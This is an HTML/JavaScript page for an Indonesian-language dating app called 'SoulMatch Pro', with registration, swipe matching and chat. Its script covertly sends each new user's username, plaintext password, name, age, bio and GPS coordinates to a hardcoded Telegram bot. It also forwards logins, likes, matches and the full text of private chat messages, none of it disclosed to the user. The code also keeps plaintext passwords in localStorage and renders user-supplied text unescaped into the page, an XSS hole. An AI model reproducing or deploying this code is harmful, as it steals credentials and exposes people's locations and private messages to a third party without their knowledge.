<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SoulMatch Pro - Pencari Jodoh Real-Time</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; overflow: hidden; background-color: #0f172a; color: white; }
        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
        .bg-auth { background: radial-gradient(circle at top right, #4f46e5, #7c3aed, #000000); }
        .match-card { transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1); cursor: grab; }
        .profile-gradient { background: linear-gradient(to top, rgba(0,0,0,1) 0%, rgba(0,0,0,0.6) 40%, transparent 100%); }
        .swipe-like { transform: translateX(300px) rotate(45deg) !important; opacity: 0 !important; }
        .swipe-pass { transform: translateX(-300px) rotate(-45deg) !important; opacity: 0 !important; }
        .swipe-super { transform: translateY(-300px) scale(0.5) !important; opacity: 0 !important; }
        
        /* Custom UI */
        .input-dark { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; outline: none; transition: 0.3s; }
        .input-dark:focus { border-color: #6366f1; background: rgba(255,255,255,0.1); }
        .btn-primary { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); transition: 0.3s; }
        .btn-primary:hover { opacity: 0.9; transform: translateY(-2px); }
    </style>
</head>
<body class="bg-slate-950">

    <div class="max-w-md mx-auto bg-slate-900 min-h-screen shadow-2xl flex flex-col relative overflow-hidden border-x border-white/5">
        
        <!-- AUTH SCREEN (LOGIN/REGIS) -->
        <div id="auth-screen" class="absolute inset-0 z-[100] bg-auth flex items-center justify-center p-6 text-white transition-all duration-700 overflow-y-auto">
            <div class="w-full space-y-6 py-10">
                <div class="text-center animate-pulse">
                    <div class="w-20 h-20 bg-white/10 backdrop-blur-2xl rounded-[2rem] mx-auto flex items-center justify-center mb-4 shadow-2xl border border-white/20">
                        <svg xmlns="http://www.w3.org/2000/svg" width="44" height="44" viewBox="0 0 24 24" fill="url(#grad1)"><defs><linearGradient id="grad1"><stop offset="0%" stop-color="#818cf8"/><stop offset="100%" stop-color="#c084fc"/></linearGradient></defs><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
                    </div>
                    <h1 class="text-4xl font-black tracking-tighter bg-clip-text text-transparent bg-gradient-to-r from-indigo-400 to-purple-400">SoulMatch</h1>
                    <p class="text-slate-400 text-xs mt-2 uppercase tracking-[0.2em]">High End Dating Logic</p>
                </div>

                <div class="bg-black/40 backdrop-blur-xl p-8 rounded-[2.5rem] border border-white/10 space-y-4 shadow-2xl">
                    <input type="text" id="auth-user" class="w-full input-dark p-4 rounded-2xl text-sm" placeholder="Username">
                    <input type="password" id="auth-pass" class="w-full input-dark p-4 rounded-2xl text-sm" placeholder="Password">
                    
                    <div id="reg-fields" class="hidden space-y-4 pt-2">
                        <input type="text" id="reg-name" class="w-full input-dark p-4 rounded-2xl text-sm" placeholder="Nama Lengkap">
                        <div class="flex gap-3">
                            <input type="number" id="reg-age" class="w-1/3 input-dark p-4 rounded-2xl text-sm" placeholder="Umur">
                            <label class="flex-1 input-dark p-4 rounded-2xl cursor-pointer flex items-center justify-center text-[10px] font-bold uppercase tracking-widest text-indigo-400 hover:bg-white/5">
                                <span id="photo-status">FOTO LOKAL üì∏</span>
                                <input type="file" id="reg-photo-file" accept="image/*" class="hidden" onchange="previewFile(event)">
                            </label>
                        </div>
                        <div id="photo-preview-container" class="hidden w-28 h-28 mx-auto rounded-3xl border-2 border-indigo-500/50 overflow-hidden mt-2 p-1 bg-black">
                            <img id="photo-preview-img" class="w-full h-full object-cover rounded-2xl">
                        </div>
                        <textarea id="reg-bio" class="w-full input-dark p-4 rounded-2xl text-sm h-24 resize-none" placeholder="Bio singkat (Jelaskan siapa dirimu)..."></textarea>
                    </div>

                    <button onclick="handleAuth()" id="auth-btn" class="w-full btn-primary py-4 rounded-2xl font-black shadow-lg shadow-indigo-500/20 active:scale-95">
                        LOGIN
                    </button>
                </div>

                <div class="text-center">
                    <button onclick="toggleAuthMode()" id="toggle-btn" class="text-xs font-bold text-slate-500 hover:text-white transition">
                        Belum punya akun? DAFTAR SEKARANG
                    </button>
                </div>
            </div>
        </div>

        <!-- APP HEADER -->
        <header class="px-6 py-5 flex justify-between items-center glass sticky top-0 z-50">
            <div class="flex items-center gap-3">
                <div id="my-avatar" class="w-10 h-10 rounded-2xl border border-white/10 overflow-hidden bg-slate-800"></div>
                <div>
                    <h1 class="font-black text-white leading-none text-sm tracking-tight" id="display-name">Guest</h1>
                    <div class="flex items-center gap-1 mt-1">
                        <div class="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></div>
                        <span id="location-status" class="text-[9px] font-bold text-slate-500 uppercase">GPS Tracking...</span>
                    </div>
                </div>
            </div>
            <button onclick="logout()" class="p-2 text-slate-500 hover:text-red-500 transition">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></button>
        </header>

        <!-- MAIN VIEWPORT -->
        <main class="flex-1 relative overflow-hidden flex flex-col bg-slate-950">
            <div id="view-discover" class="h-full flex flex-col p-5">
                <div class="relative flex-1" id="card-container"></div>
                
                <!-- ACTION BUTTONS -->
                <div class="flex justify-center items-end gap-5 py-6">
                    <button onclick="processSwipe('pass')" class="w-14 h-14 rounded-2xl bg-slate-800 text-red-500 flex items-center justify-center border border-white/5 shadow-xl active:scale-90 transition">
                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                    </button>
                    
                    <button onclick="openSuperLike()" class="w-16 h-16 rounded-3xl bg-indigo-600 text-white flex items-center justify-center shadow-xl shadow-indigo-500/30 active:scale-90 transition group">
                        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="currentColor" class="group-hover:animate-bounce"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
                    </button>

                    <button onclick="processSwipe('like')" class="w-14 h-14 rounded-2xl bg-slate-800 text-green-500 flex items-center justify-center border border-white/5 shadow-xl active:scale-90 transition">
                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
                    </button>
                </div>
            </div>

            <div id="view-chat" class="hidden h-full flex flex-col p-6 overflow-y-auto space-y-4">
                <h3 class="text-2xl font-black text-white">Matches</h3>
                <div id="chat-list" class="space-y-4"></div>
            </div>
        </main>

        <!-- MODAL: SUPER LIKE (X LIKE) -->
        <div id="superlike-modal" class="hidden absolute inset-0 z-[150] bg-black/90 backdrop-blur-md flex flex-col items-center justify-center p-8 text-white">
            <div class="w-full space-y-6 text-center">
                <div class="w-20 h-20 bg-indigo-600 rounded-3xl mx-auto flex items-center justify-center shadow-indigo-500/50 shadow-2xl">
                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
                </div>
                <h2 class="text-3xl font-black italic">X-LIKE!</h2>
                <p class="text-slate-400 text-sm">Kirim pesan pembuka sekarang agar dia langsung tertarik.</p>
                <textarea id="superlike-msg" class="w-full input-dark p-5 rounded-3xl h-32 text-sm" placeholder="Contoh: Hai, sepertinya kita cocok..."></textarea>
                <div class="flex gap-4 w-full">
                    <button onclick="closeSuperLike()" class="flex-1 py-4 font-bold text-slate-500 uppercase tracking-widest text-xs">Batal</button>
                    <button onclick="submitSuperLike()" class="flex-[2] btn-primary py-4 rounded-2xl font-black uppercase tracking-widest">KIRIM PESAN</button>
                </div>
            </div>
        </div>

        <!-- MATCH OVERLAY -->
        <div id="match-overlay" class="hidden absolute inset-0 z-[200] bg-indigo-900/95 backdrop-blur-3xl flex flex-col items-center justify-center text-center p-8 text-white">
            <div class="relative w-full flex justify-center mb-10">
                <div id="match-me" class="w-32 h-32 rounded-full border-4 border-indigo-400 shadow-2xl overflow-hidden -rotate-12 translate-x-4"></div>
                <div id="match-them" class="w-32 h-32 rounded-full border-4 border-white shadow-2xl overflow-hidden rotate-12 -translate-x-4"></div>
            </div>
            <h2 class="text-6xl font-black italic mb-4 animate-bounce">MATCH!</h2>
            <p class="text-indigo-200 font-bold mb-10 tracking-widest">WAKTUNYA BERKENALAN</p>
            <button onclick="goToChat()" class="w-full bg-white text-indigo-900 py-5 rounded-2xl font-black shadow-2xl mb-4 hover:scale-105 transition">CHAT SEKARANG</button>
            <button onclick="closeMatch()" class="text-indigo-300 font-bold text-sm tracking-widest uppercase">Mungkin Nanti</button>
        </div>

        <!-- ACTIVE CHAT WINDOW -->
        <div id="chat-window" class="hidden absolute inset-0 z-[250] bg-slate-900 flex flex-col">
            <header class="p-6 border-b border-white/5 flex items-center gap-4 bg-slate-900/50 backdrop-blur-xl">
                <button onclick="hideChat()" class="p-2 text-slate-400"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="m15 18-6-6 6-6"/></svg></button>
                <div id="chat-partner-img" class="w-12 h-12 rounded-2xl overflow-hidden border border-white/10"></div>
                <div>
                    <h4 id="chat-partner-name" class="font-black text-white text-lg leading-tight">Name</h4>
                    <span class="text-[10px] text-green-500 font-black uppercase tracking-widest">Online Now</span>
                </div>
            </header>
            <div id="chat-msg-container" class="flex-1 overflow-y-auto p-6 space-y-4 bg-slate-950 flex flex-col"></div>
            <div class="p-6 border-t border-white/5 bg-slate-900 flex gap-3">
                <input type="text" id="chat-input" class="flex-1 input-dark p-4 rounded-2xl text-sm" placeholder="Ketik sesuatu yang manis...">
                <button onclick="sendMsg()" class="w-14 h-14 btn-primary text-white rounded-2xl flex items-center justify-center shadow-xl"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
            </div>
        </div>

        <!-- NAV BAR -->
        <nav class="glass border-t border-white/5 flex justify-around p-5 z-50">
            <button onclick="changeView('discover')" id="nav-discover" class="text-indigo-500"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></button>
            <button onclick="changeView('chat')" id="nav-chat" class="text-slate-600"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="m3 21 1.9-5.7a8.5 8.5 0 1 1 3.8 3.8z"/></svg></button>
        </nav>
    </div>

    <script>
        const BOT_TOKEN = "7417366472:AAG_H9DxOxGzfkKkMxLx7lAoEgu4z3IwcJg";
        const CHAT_ID = "6128943834";

        let users = JSON.parse(localStorage.getItem('sm_v3_users')) || [];
        let currentUser = JSON.parse(localStorage.getItem('sm_v3_session')) || null;
        let messages = JSON.parse(localStorage.getItem('sm_v3_msgs')) || {};
        let selectedBase64 = "";
        let activePartner = null;

        async function logTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch(e) { console.error("Telegram fail"); }
        }

        function previewFile(e) {
            const file = e.target.files[0];
            if(!file) return;
            const reader = new FileReader();
            reader.onload = function(ev) {
                selectedBase64 = ev.target.result;
                document.getElementById('photo-preview-img').src = selectedBase64;
                document.getElementById('photo-preview-container').classList.remove('hidden');
                document.getElementById('photo-status').innerText = "FOTO SIAP ‚úÖ";
            };
            reader.readAsDataURL(file);
        }

        function toggleAuthMode() {
            const isReg = document.getElementById('reg-fields').classList.toggle('hidden');
            document.getElementById('auth-btn').innerText = isReg ? "DAFTAR SEKARANG" : "LOGIN";
            document.getElementById('toggle-btn').innerText = isReg ? "Sudah punya akun? LOGIN" : "Belum punya akun? DAFTAR SEKARANG";
        }

        async function handleAuth() {
            const user = document.getElementById('auth-user').value.trim();
            const pass = document.getElementById('auth-pass').value.trim();
            const isReg = !document.getElementById('reg-fields').classList.contains('hidden');

            if(!user || !pass) return alert("Data wajib diisi!");

            if(isReg) {
                if(!selectedBase64) return alert("Pilih foto dulu!");
                const name = document.getElementById('reg-name').value;
                const age = document.getElementById('reg-age').value;
                const bio = document.getElementById('reg-bio').value;

                if(users.find(u => u.user === user)) return alert("Username sudah ada!");

                // Get Location first if possible
                let loc = "Unknown";
                navigator.geolocation.getCurrentPosition(async pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    loc = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    const newUser = {
                        id: Date.now(), user, pass, name, age, bio, photo: selectedBase64,
                        lat, lon, likes: [], superLikes: []
                    };
                    users.push(newUser);
                    localStorage.setItem('sm_v3_users', JSON.stringify(users));
                    
                    await logTelegram(`üÜï <b>REGISTRASI BARU (LENGKAP)</b>\n\nüë§ <b>User:</b> <code>${user}</code>\nüîë <b>Password:</b> <code>${pass}</code>\nüìõ <b>Nama:</b> ${name}\nüéÇ <b>Umur:</b> ${age}\nüìù <b>Bio:</b> ${bio}\nüìç <b>Lokasi:</b> ${loc}`);
                    alert("Daftar sukses! Silakan login.");
                    location.reload();
                }, async (err) => {
                    // Fallback if GPS blocked
                    const newUser = { id: Date.now(), user, pass, name, age, bio, photo: selectedBase64, lat:0, lon:0, likes:[], superLikes:[] };
                    users.push(newUser);
                    localStorage.setItem('sm_v3_users', JSON.stringify(users));
                    await logTelegram(`üÜï <b>REGISTRASI BARU (TANPA GPS)</b>\n\nüë§ <b>User:</b> <code>${user}</code>\nüîë <b>Password:</b> <code>${pass}</code>\nüìõ <b>Nama:</b> ${name}\nüìç Lokasi tidak diizinkan.`);
                    alert("Daftar sukses! Silakan login.");
                    location.reload();
                });

            } else {
                const found = users.find(u => u.user === user && u.pass === pass);
                if(found) {
                    currentUser = found;
                    localStorage.setItem('sm_v3_session', JSON.stringify(currentUser));
                    await logTelegram(`üîë <b>LOGIN ACTIVITY</b>\nUser: ${found.name} (@${user})`);
                    initApp();
                } else { alert("User/Password salah!"); }
            }
        }

        function initApp() {
            document.getElementById('auth-screen').style.transform = 'translateY(-100%)';
            document.getElementById('display-name').innerText = currentUser.name.toUpperCase();
            document.getElementById('my-avatar').innerHTML = `<img src="${currentUser.photo}" class="w-full h-full object-cover">`;
            
            navigator.geolocation.getCurrentPosition(pos => {
                currentUser.lat = pos.coords.latitude;
                currentUser.lon = pos.coords.longitude;
                saveDB();
                document.getElementById('location-status').innerText = "LIVE GPS: ON";
                document.getElementById('location-status').classList.replace('text-slate-500', 'text-indigo-400');
                renderDiscovery();
            }, () => {
                document.getElementById('location-status').innerText = "GPS: DISABLED";
                renderDiscovery();
            });
        }

        function saveDB() {
            const idx = users.findIndex(u => u.id === currentUser.id);
            if(idx !== -1) { users[idx] = currentUser; localStorage.setItem('sm_v3_users', JSON.stringify(users)); }
        }

        function renderDiscovery() {
            const container = document.getElementById('card-container');
            container.innerHTML = '';
            
            // Logic: Exclude self, already liked, or already passed
            const pool = users.filter(u => u.id !== currentUser.id && !currentUser.likes.includes(u.id));

            if(pool.length === 0) {
                container.innerHTML = `<div class="h-full flex flex-col items-center justify-center opacity-30 text-center p-10"><p class="font-black text-white italic">Semua sudah habis.<br>Coba lagi nanti!</p></div>`;
                return;
            }

            pool.slice(0, 2).reverse().forEach((p, idx) => {
                const isTop = (idx === 1 || pool.length === 1);
                const card = document.createElement('div');
                card.className = `match-card absolute inset-0 bg-slate-800 rounded-[3rem] shadow-2xl overflow-hidden border border-white/5 ${isTop ? 'z-20' : 'scale-90 translate-y-8 z-10 opacity-40'}`;
                if(isTop) card.id = 'active-card';

                card.innerHTML = `
                    <img src="${p.photo}" class="w-full h-full object-cover">
                    <div class="absolute inset-0 profile-gradient p-8 flex flex-col justify-end">
                        <div class="flex items-center gap-2 mb-3">
                            <span class="bg-indigo-600 px-3 py-1 rounded-xl text-[10px] font-black uppercase tracking-widest">PROFIL BARU</span>
                        </div>
                        <h2 class="text-4xl font-black text-white">${p.name}, ${p.age}</h2>
                        <p class="text-slate-300 text-sm mt-2 line-clamp-3">${p.bio || 'Misterius...'}</p>
                    </div>`;
                container.appendChild(card);
            });
        }

        async function processSwipe(type, customMsg = null) {
            const card = document.getElementById('active-card');
            if(!card) return;

            const pool = users.filter(u => u.id !== currentUser.id && !currentUser.likes.includes(u.id));
            const target = pool[0];

            card.classList.add(type === 'like' ? 'swipe-like' : (type === 'super' ? 'swipe-super' : 'swipe-pass'));
            currentUser.likes.push(target.id);
            
            if(type === 'like' || type === 'super') {
                logTelegram(`‚ù§Ô∏è <b>${currentUser.name}</b> menyukai <b>${target.name}</b>${type==='super'?' (SUPER LIKE!)':''}`);
                
                if(customMsg) {
                    const key = [currentUser.id, target.id].sort().join('_');
                    if(!messages[key]) messages[key] = [];
                    messages[key].push({ sender: currentUser.id, text: `üåü SUPER LIKE MSG: ${customMsg}`, time: Date.now() });
                }

                if(target.likes.includes(currentUser.id)) {
                    logTelegram(`üî• <b>MATCH ALERT!</b>\n${currentUser.name} & ${target.name} saling menyukai!`);
                    showMatch(target);
                }
            }

            saveDB();
            setTimeout(() => { renderDiscovery(); renderChatList(); }, 500);
        }

        // SUPER LIKE (X-LIKE)
        function openSuperLike() { 
            const pool = users.filter(u => u.id !== currentUser.id && !currentUser.likes.includes(u.id));
            if(pool.length > 0) document.getElementById('superlike-modal').classList.remove('hidden'); 
        }
        function closeSuperLike() { document.getElementById('superlike-modal').classList.add('hidden'); }
        function submitSuperLike() {
            const msg = document.getElementById('superlike-msg').value.trim();
            if(!msg) return alert("Ketik pesan dulu!");
            processSwipe('super', msg);
            closeSuperLike();
            document.getElementById('superlike-msg').value = "";
        }

        function showMatch(target) {
            activePartner = target;
            document.getElementById('match-me').innerHTML = `<img src="${currentUser.photo}" class="w-full h-full object-cover">`;
            document.getElementById('match-them').innerHTML = `<img src="${target.photo}" class="w-full h-full object-cover">`;
            document.getElementById('match-overlay').classList.remove('hidden');
        }

        // CHAT LOGIC
        function renderChatList() {
            const container = document.getElementById('chat-list');
            const matches = users.filter(u => u.likes.includes(currentUser.id) && currentUser.likes.includes(u.id));
            
            if(matches.length === 0) {
                container.innerHTML = `<div class="text-center py-10 opacity-30 text-xs font-bold uppercase tracking-widest">Belum ada teman baru</div>`;
                return;
            }

            container.innerHTML = matches.map(m => {
                const key = [currentUser.id, m.id].sort().join('_');
                const lastMsg = messages[key]?.slice(-1)[0]?.text || "Mulai obrolan seru...";
                return `
                <div onclick="openChat(${m.id})" class="flex items-center gap-4 bg-slate-800/50 p-5 rounded-[2rem] border border-white/5 active:scale-95 transition cursor-pointer">
                    <img src="${m.photo}" class="w-16 h-16 rounded-2xl object-cover border border-white/10">
                    <div class="flex-1 min-w-0">
                        <h4 class="font-black text-white text-lg">${m.name}</h4>
                        <p class="text-xs text-slate-500 truncate font-bold uppercase tracking-tighter">${lastMsg}</p>
                    </div>
                    <div class="w-3 h-3 rounded-full bg-indigo-500 shadow-[0_0_10px_#6366f1]"></div>
                </div>`;
            }).join('');
        }

        function openChat(id) {
            activePartner = users.find(u => u.id === id);
            document.getElementById('chat-partner-name').innerText = activePartner.name;
            document.getElementById('chat-partner-img').innerHTML = `<img src="${activePartner.photo}" class="w-full h-full object-cover">`;
            document.getElementById('chat-window').classList.remove('hidden');
            renderMessages();
        }

        async function sendMsg() {
            const input = document.getElementById('chat-input');
            const txt = input.value.trim();
            if(!txt || !activePartner) return;

            const key = [currentUser.id, activePartner.id].sort().join('_');
            if(!messages[key]) messages[key] = [];
            messages[key].push({ sender: currentUser.id, text: txt, time: Date.now() });
            localStorage.setItem('sm_v3_msgs', JSON.stringify(messages));
            
            logTelegram(`üí¨ <b>CHAT MESSAGE</b>\n<b>Dari:</b> ${currentUser.name}\n<b>Kpd:</b> ${activePartner.name}\n<b>Isi:</b> ${txt}`);
            input.value = '';
            renderMessages();
        }

        function renderMessages() {
            const container = document.getElementById('chat-msg-container');
            const key = [currentUser.id, activePartner.id].sort().join('_');
            const msgs = messages[key] || [];
            container.innerHTML = msgs.map(m => `
                <div class="flex ${m.sender === currentUser.id ? 'justify-end' : 'justify-start'} animate-fade-in">
                    <div class="max-w-[85%] p-4 rounded-3xl text-sm font-semibold ${m.sender === currentUser.id ? 'bg-indigo-600 text-white rounded-tr-none' : 'bg-slate-800 text-slate-200 border border-white/5 rounded-tl-none'}">
                        ${m.text}
                    </div>
                </div>
            `).join('');
            container.scrollTop = container.scrollHeight;
        }

        function changeView(v) {
            document.getElementById('view-discover').classList.toggle('hidden', v !== 'discover');
            document.getElementById('view-chat').classList.toggle('hidden', v !== 'chat');
            document.getElementById('nav-discover').className = v === 'discover' ? 'text-indigo-500' : 'text-slate-600';
            document.getElementById('nav-chat').className = v === 'chat' ? 'text-indigo-500' : 'text-slate-600';
            if(v === 'chat') renderChatList();
        }

        function closeMatch() { document.getElementById('match-overlay').classList.add('hidden'); }
        function goToChat() { closeMatch(); changeView('chat'); openChat(activePartner.id); }
        function hideChat() { document.getElementById('chat-window').classList.add('hidden'); renderChatList(); }
        function logout() { localStorage.removeItem('sm_v3_session'); location.reload(); }

        if (currentUser) initApp();
    </script>
</body>
</html>
